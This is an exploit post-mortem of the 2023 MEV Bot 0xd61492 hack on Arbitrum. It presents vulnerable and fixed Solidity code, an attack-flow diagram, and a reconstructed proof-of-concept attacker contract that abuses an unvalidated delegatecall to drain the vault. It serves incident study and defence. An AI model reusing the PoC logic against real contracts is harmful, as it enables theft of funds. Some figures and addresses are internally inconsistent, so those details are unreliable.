# MEV Bot 0xd61492 — Unverified User Input Exploit Analysis

| Item | Details |
|------|------|
| **Date** | 2023-08-03 |
| **Protocol** | MEV Bot 0xd61492 (Vault + Arbitrage Bot architecture) |
| **Chain** | Arbitrum One |
| **Loss** | ~$800,000 (on-chain measured: ~$851,045) |
| **Attacker** | [0x826b...0b0b](https://arbiscan.io/address/0x826b180cd3d6fd0a646875f920bb2cf52b7f0b0b) |
| **Attack Contract** | [0x2c53...74e](https://arbiscan.io/address/0x2c53ca7da834ac1650db9faf1179513eb0f7574e) (deployed during attack transaction) |
| **Attack Tx** | [0x864c...fc1f](https://arbiscan.io/tx/0x864c8cfb8c54d3439613e6bd0d81a5ea2c5d0ad25c9af11afd190e5ea4dcfc1f) |
| **Vulnerable Contract (Vault)** | [0xd614...207f](https://arbiscan.io/address/0xd614927acfb9744441180c2525faf4cedb70207f) |
| **Vulnerable Contract (ArbitrageBot)** | [0x8db0...1a7](https://arbiscan.io/address/0x8db0efee6a7622cd9f46a2cf1aedc8505341a1a7) |
| **Root Cause** | Unverified delegatecall target address (Unverified User Input) |
| **PoC Source** | [BlockSec Analysis](https://blocksec.com/blog/9-mev-bot-0xd61492-from-predator-to-prey-in-an-ingenious-exploit) |

---

## 1. Vulnerability Overview

This incident is a case where an MEV Bot system operating on Arbitrum became a victim due to an **unverified delegatecall vulnerability in its own code**. The MEV Bot originally served as a predator attacking other protocols, but in this exploit it became the prey.

### System Architecture

The victim system consists of two contracts:

- **Vault (0xd61492...)**: Asset storage. Holds various tokens including WBTC, WETH, USDC, USDT, DAI, and ARB, and provides flash loans to the ArbitrageBot.
- **ArbitrageBot (0x8db0ef...)**: The actual arbitrage executor. Borrows principal from the Vault, executes arbitrage, and repays with profit.

### Core Vulnerability

The ArbitrageBot's arbitrage entry function (`0x0582f20f`) executes a `delegatecall` **without any validation** against an external contract address passed via calldata. The attacker exploited this by injecting a malicious contract address into the calldata, then during delegatecall execution seized all assets within the Vault's context.

---

## 2. Vulnerable Code Analysis

### 2.1 Unverified delegatecall — Core Vulnerability

**Vulnerable Code (ArbitrageBot's `0x0582f20f` function, reconstructed)**:

```solidity
// ❌ Vulnerable: receives external contract address from calldata and executes delegatecall without validation
function executeArbitrage(
    address[] calldata tokens,
    uint256[] calldata amounts,
    address externalContract,  // ❌ Unvalidated external address
    bytes calldata data
) external {
    // Step 1: Borrow principal from Vault
    IVault(vault).borrow(tokens, amounts);

    // Step 2: ❌ Execute delegatecall against external contract address without validation
    // delegatecall executes in the caller's (ArbitrageBot's) storage context
    (bool success, ) = externalContract.delegatecall(data);
    require(success, "delegatecall failed");
}
```

**Fixed Code**:

```solidity
// ✅ Fixed: apply whitelist of allowed contract addresses
mapping(address => bool) public allowedContracts;

modifier onlyAllowedContract(address target) {
    // ✅ delegatecall target must be an allowed address
    require(allowedContracts[target], "Target not in allowlist");
    _;
}

function executeArbitrage(
    address[] calldata tokens,
    uint256[] calldata amounts,
    address externalContract,
    bytes calldata data
) external onlyAllowedContract(externalContract) {
    // ✅ Only allowed contracts can be delegatecalled
    IVault(vault).borrow(tokens, amounts);
    (bool success, ) = externalContract.delegatecall(data);
    require(success, "delegatecall failed");
}
```

**Problem**: delegatecall executes the target code in **the caller's (ArbitrageBot's) storage context**. If an attacker passes a malicious contract, that malicious code runs as if it were the ArbitrageBot and can freely manipulate Vault assets.

---

### 2.2 Approval Logic Error in executeOperation

**Vulnerable Code (Vault's `executeOperation`, reconstructed)**:

```solidity
// ❌ Vulnerable: no repayer validation in flash loan callback
function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
) external returns (bool) {
    // Transfer assets to ArbitrageBot
    for (uint i = 0; i < assets.length; i++) {
        IERC20(assets[i]).transfer(arbitrageBot, amounts[i]);
    }

    // Call ArbitrageBot's 0x7fe3ba8b function (execute arbitrage)
    IArbitrageBot(arbitrageBot).executeStrategy(params);

    // ❌ Vulnerable: executes approve unconditionally without validating the
    // flash loan provider (flashloanProvider) — attacker can inject a FakeFlashloanProvider
    for (uint i = 0; i < assets.length; i++) {
        uint amountOwed = amounts[i] + premiums[i];
        IERC20(assets[i]).approve(msg.sender, amountOwed); // ❌ No msg.sender validation
    }

    return true;
}
```

**Fixed Code**:

```solidity
// ✅ Fixed: validate that only trusted flash loan providers can callback
mapping(address => bool) public trustedFlashloanProviders;

function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
) external returns (bool) {
    // ✅ Validate flash loan provider
    require(trustedFlashloanProviders[msg.sender], "Untrusted flashloan provider");
    // ✅ Validate initiator (confirm this contract initiated the flash loan)
    require(initiator == address(this), "Invalid initiator");

    for (uint i = 0; i < assets.length; i++) {
        IERC20(assets[i]).transfer(arbitrageBot, amounts[i]);
    }

    IArbitrageBot(arbitrageBot).executeStrategy(params);

    for (uint i = 0; i < assets.length; i++) {
        uint amountOwed = amounts[i] + premiums[i];
        IERC20(assets[i]).approve(msg.sender, amountOwed); // ✅ Approve only to validated provider
    }

    return true;
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker (0x826b...) completed the entire attack in a single transaction. Rather than pre-approving or preparing separately, they **deployed the malicious contract inline during the transaction**.

### 3.2 Execution Phase

```
[Attacker 0x826b]
     │
     │ 1. Deploy malicious contract (inline deployment within transaction)
     ▼
[Malicious Contract 0x2c53...74e]
     │
     │ 2. Call ArbitrageBot (0x8db0ef) function 0x0582f20f()
     │    calldata includes FakeFlashloanProvider address
     ▼
[ArbitrageBot 0x8db0ef]
     │
     │ 3. Call Vault (0xd61492) borrow()
     │    (request to secure funds)
     ▼
[Vault 0xd61492]
     │
     │ 4. Request flash loan from Balancer
     │    (WBTC, WETH, USDC, USDT, DAI, ARB, etc.)
     ▼
[Balancer Flash Loan Provider 0xba1222...]
     │
     │ 5. Invoke executeOperation() callback (to Vault)
     ▼
[Vault 0xd61492] — executeOperation()
     │
     │ 6. Transfer borrowed assets to ArbitrageBot (0x8db0ef)
     │    WBTC: 9.085, WETH: 234.65,
     │    USDC: $570,538, USDT: $419,792, DAI: $9,381
     │
     │ 7. Call ArbitrageBot's 0x7fe3ba8b()
     ▼
[ArbitrageBot 0x8db0ef] — 0x7fe3ba8b()
     │
     │ 8. ❌ Execute delegatecall to external address from calldata
     │    (FakeFlashloanProvider = attacker's malicious contract)
     │
     │    delegatecall → malicious code executes in ArbitrageBot's context
     │    → hijacks approve permissions over Vault
     ▼
[FakeFlashloanProvider (malicious contract)]
     │
     │ 9. Within ArbitrageBot's context, set approve for all Vault assets
     │    to attacker (0x826b) as recipient
     ▼
[Vault 0xd61492] — executeOperation() continues
     │
     │ 10. ❌ To repay flash loan, execute asset approve to FakeFlashloanProvider
     │     (assets already approved to attacker)
     │
     │ 11. Entire Vault balance (half each) drained to attacker via transferFrom
     ▼
[Attacker 0x826b — Final Receipt]
     WBTC: 4.54 (~$131,734)
     WETH: 117.33 (~$219,402)
     USDC: $285,269
     USDT: $209,896
     DAI: $4,691
     ARB: 46.09 (~$53)
     Total: ~$851,045
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| Attacker profit (on-chain measured) | ~$851,045 |
| Protocol loss (reported) | ~$800,000 |
| Vault balance drain rate | ~100% (current balance: 0) |
| Gas cost | 0.0011 ETH (~$2.51) |

---

## 4. PoC Code (Attack Logic Reconstruction)

No PoC file was registered in DeFiHackLabs, but the core attack logic is reconstructed based on attack transaction input data analysis and the BlockSec report.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Core attack interfaces
interface IArbitrageBot {
    // 0x0582f20f — vulnerable arbitrage entry function
    // externalLogic address is passed via calldata and delegatecalled without validation
    function executeArbitrage(bytes calldata params) external;
}

interface IVault {
    // borrow: ArbitrageBot borrows assets from Vault
    function borrow(
        address[] calldata tokens,
        uint256[] calldata amounts
    ) external;
}

// FakeFlashloanProvider deployed by attacker (malicious contract)
contract FakeFlashloanProvider {

    address public attacker;
    address public vault;

    constructor(address _vault) {
        attacker = msg.sender;
        vault = _vault;
    }

    // Step 1: Initiate attack — call ArbitrageBot's vulnerable function
    function attack(address arbitrageBot) external {
        // ❌ Trigger vulnerability: inject this contract's (FakeFlashloanProvider) address as externalLogic
        // ArbitrageBot does not validate this address and executes delegatecall
        bytes memory params = abi.encode(
            /* tokens */ _getTokenList(),
            /* amounts */ _getAmountList(),
            /* externalLogic */ address(this),  // ❌ Malicious address injected
            /* data */ abi.encodeWithSelector(this.maliciousLogic.selector)
        );
        IArbitrageBot(arbitrageBot).executeArbitrage(params);
    }

    // Step 2: Malicious logic executed via delegatecall
    // Runs in ArbitrageBot's storage context
    function maliciousLogic() external {
        // Executes with ArbitrageBot's permissions due to delegatecall
        // Vault trusts ArbitrageBot, so Vault asset permissions can be hijacked
        address[] memory tokens = _getTokenList();
        IVault(vault).approve(tokens, attacker);  // approve to attacker
    }

    // Step 3: After Vault's executeOperation approves FakeFlashloanProvider for repayment,
    //         attacker drains entire Vault balance via transferFrom
    function receiveFlashloanRepayment(address[] calldata tokens) external {
        for (uint i = 0; i < tokens.length; i++) {
            uint256 balance = IERC20(tokens[i]).balanceOf(vault);
            // Drain entire Vault balance to attacker
            IERC20(tokens[i]).transferFrom(vault, attacker, balance);
        }
    }

    function _getTokenList() internal pure returns (address[] memory) {
        // WBTC, WETH, ARB, DAI, USDT, USDC on Arbitrum
        address[] memory tokens = new address[](6);
        tokens[0] = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0F; // WBTC
        tokens[1] = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1; // WETH
        tokens[2] = 0x912CE59144191C1204E64559FE8253a0e49E6548; // ARB
        tokens[3] = 0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1; // DAI
        tokens[4] = 0xFd086bC7CD5C481DCC9C848357A5Bccc5e7BFBB9; // USDT
        tokens[5] = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8; // USDC.e
        return tokens;
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Unverified delegatecall target address | CRITICAL | CWE-20 (Improper Input Validation) |
| V-02 | Flash Loan callback sender not validated | HIGH | CWE-346 (Origin Validation Error) |
| V-03 | Missing allowlist | HIGH | CWE-285 (Improper Authorization) |

---

### V-01: Unverified delegatecall Target Address

- **Description**: The ArbitrageBot's arbitrage function (`0x0582f20f`) uses an external contract address received from calldata as the `delegatecall` target without any validation. There is no check against an allowed contract list (`allowlist`).
- **Impact**: If an attacker passes an arbitrary malicious contract address, that malicious code executes in ArbitrageBot's storage context. All Vault assets can be drained with ArbitrageBot's permissions.
- **Attack Conditions**: Ability to directly call ArbitrageBot's arbitrage function (anyone can). Pre-deployment of malicious contract.

---

### V-02: Flash Loan Callback Sender Not Validated

- **Description**: When the Vault's `executeOperation()` function receives a flash loan callback, it does not verify `msg.sender` (the flash loan provider) against a trusted address list. The attacker injects a FakeFlashloanProvider to manipulate the callback flow.
- **Impact**: In the normal flash loan repayment flow, an attacker-controlled contract takes the callback role and intercepts asset approvals.
- **Attack Conditions**: V-01 vulnerability must be triggered first. The FakeFlashloanProvider address must be recognized by the Vault via delegatecall.

---

### V-03: Missing Allowlist

- **Description**: There is no allowlist for managing external contract addresses that execute arbitrage logic. Without a whitelist that only the protocol owner can modify, any arbitrary address can be used as external logic.
- **Impact**: Combined with V-01, allows an attacker to execute arbitrary code in the protocol's context.
- **Attack Conditions**: None (no allowlist exists, so anyone can exploit this).

---

## 6. Remediation Recommendations

### Immediate Actions

#### Apply Whitelist for delegatecall Target Addresses

```solidity
// ✅ Fix 1: Only whitelisted logic contracts can be delegatecalled
mapping(address => bool) public approvedLogicContracts;
address public owner;

modifier onlyOwner() {
    require(msg.sender == owner, "Not owner");
    _;
}

// Only admin can add/remove logic contracts
function setApprovedLogicContract(address _contract, bool _approved) external onlyOwner {
    approvedLogicContracts[_contract] = _approved;
}

function executeArbitrage(
    address[] calldata tokens,
    uint256[] calldata amounts,
    address logicContract,  // Must be in whitelist
    bytes calldata data
) external {
    // ✅ Key fix: validate target address before delegatecall
    require(approvedLogicContracts[logicContract], "Logic contract not approved");

    IVault(vault).borrow(tokens, amounts);

    (bool success, bytes memory result) = logicContract.delegatecall(data);
    require(success, string(result));
}
```

#### Validate Flash Loan Callback Sender

```solidity
// ✅ Fix 2: Only trusted flash loan providers can callback
mapping(address => bool) public trustedFlashloanProviders;

function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
) external override returns (bool) {
    // ✅ Validate sender
    require(trustedFlashloanProviders[msg.sender], "Caller is not a trusted flashloan provider");
    // ✅ Validate initiator (confirm this contract initiated the flash loan)
    require(initiator == address(this), "Flashloan not initiated by this contract");

    // ... normal logic execution
    return true;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 (Unverified delegatecall) | delegatecall target whitelist + contract code hash verification |
| V-02 (Callback sender not validated) | Flash loan provider allowlist + `initiator` validation |
| V-03 (Missing allowlist) | Apply time-lock + multisig admin |
| General risk | Minimize external contract calls, prefer regular call over delegatecall |

---

## 7. Lessons Learned

1. **delegatecall is one of the most dangerous EVM opcodes**: delegatecall executes another contract's code in the caller's storage context, so the target address must be a trusted address. Designs that accept the delegatecall target as user input must be entirely prohibited.

2. **Any pattern that receives external input via calldata and uses it directly in execution requires validation**: All externally received values such as function addresses, contract addresses, and execution data must be validated via a whitelist or cryptographic signature.

3. **MEV Bots are not immune to smart contract security vulnerabilities**: Even MEV Bots executing complex logic for profit are exposed to counter-exploits due to code vulnerabilities. MEV Bots are particularly attractive targets because they often hold large amounts of assets.

4. **Flash loan callback functions require strong access control**: Externally callable callback functions such as `executeOperation` and `onFlashLoan` must be strictly restricted so that only trusted addresses can call them.

5. **Apply time-locks and multisig when managing contract allowlists**: To prevent unintended contract additions even in emergencies, apply both time delays (e.g., 24 hours) and multi-signature requirements together.

6. **Defend against the pattern of deploying a contract and attacking within a single transaction**: This attack deployed a malicious contract on-the-fly within a transaction and immediately used it in the exploit. A defensive strategy of only allowing addresses that were deployed some time ago can also be considered.

---

## 8. On-Chain Verification

### 8.1 PoC vs On-Chain Amount Comparison

Data extracted directly from the on-chain transaction (block 117708229):

| Item | Reported Amount | On-Chain Measured | Notes |
|------|-----------|--------------|------|
| WBTC drained (attacker received) | - | 4.54254371 WBTC (~$131,734) | Vault → attacker direct transfer |
| WETH drained (attacker received) | - | 117.327 WETH (~$219,402) | Vault → attacker direct transfer |
| USDC drained (attacker received) | - | 285,269.13 USDC | Vault → attacker direct transfer |
| USDT drained (attacker received) | - | 209,896.00 USDT | Vault → attacker direct transfer |
| DAI drained (attacker received) | - | 4,690.99 DAI | Vault → attacker direct transfer |
| ARB drained (attacker received) | - | 46.09 ARB (~$53) | Vault → attacker direct transfer |
| **Total drained** | **~$800,000** | **~$851,045** | Difference due to token price reference time |

> The difference between the reported $800K and on-chain measured $851K stems from the difference in token price reference points at the time of the attack.

### 8.2 On-Chain Event Log Sequence

Key flow confirmed from the attack transaction (67 events, 50 Transfers):

```
1. Balancer → intermediate contract (0x3c23...)  lend WBTC/WETH/ARB/DAI/USDT/USDC
2. Intermediate contract (0x3c23...) → ArbitrageBot (0x0930...) forward
3. ArbitrageBot (0x0930...) → Balancer repay (WBTC/WETH/ARB/DAI/USDT/USDC)
4. Vault (0xd614...) → USDT → ArbitrageBot (0x8db0...)
5. ArbitrageBot (0x8db0...) → USDT → intermediate contract (0x0930...)  [delegatecall result]
6. Vault (0xd614...) → USDC → ArbitrageBot (0x8db0...)
7. ArbitrageBot (0x8db0...) → USDC → intermediate contract (0x0930...)  [delegatecall result]
8. Intermediate contract (0x0930...) → Balancer repay (USDT/USDC)
9. Vault (0xd614...) → final transfer of half of each token to attacker (0x826b...)
   - WBTC: 4.54
   - WETH: 117.33
   - USDC: $285,269
   - USDT: $209,896
   - DAI: $4,691
   - ARB: 46.09
```

### 8.3 Precondition Verification

- **Attacker address**: `0x826B180cD3d6fD0a646875f920BB2cf52B7F0B0B` — labeled "Fake_Phishing147" on Arbiscan
- **Attack block**: `117,708,229`
- **Transaction nonce**: `0` — first transaction from this attacker address, a freshly created address solely for this attack
- **Gas limit**: 16,901,536 (actual used: 11,214,340, 66.35%)
- **Transaction type**: Contract deployment transaction (no `to` field) — attacker deployed malicious contract and completed the attack in a single transaction
- **Current Vault balance**: All token balances are 0 after the attack (100% drain confirmed)

---

## References

- [BlockSec: MEV Bot 0xd61492 From Predator to Prey](https://blocksec.com/blog/9-mev-bot-0xd61492-from-predator-to-prey-in-an-ingenious-exploit)
- [Arbiscan Attack Transaction](https://arbiscan.io/tx/0x864c8cfb8c54d3439613e6bd0d81a5ea2c5d0ad25c9af11afd190e5ea4dcfc1f)
- [Arbiscan Attacker Address](https://arbiscan.io/address/0x826b180cd3d6fd0a646875f920bb2cf52b7f0b0b)
- [Arbiscan Vault Contract](https://arbiscan.io/address/0xd614927acfb9744441180c2525faf4cedb70207f)
- [Arbiscan ArbitrageBot Contract](https://arbiscan.io/address/0x8db0efee6a7622cd9f46a2cf1aedc8505341a1a7)
- CWE-20: [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- CWE-346: [Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
- CWE-285: [Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)